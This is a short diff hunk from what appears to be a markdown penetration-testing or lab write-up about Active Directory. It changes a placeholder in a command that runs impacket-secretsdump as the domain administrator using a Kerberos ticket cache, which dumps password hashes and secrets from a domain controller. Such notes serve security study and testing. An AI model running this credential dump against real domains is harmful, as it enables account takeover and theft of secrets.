@@ -260,7 +260,7 @@ $ export KRB5CCNAME=administrator.ccache
 ```
 
 ```console
-sudo ntpdate -s <DC> && impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
 ```console {class="sample-code"}
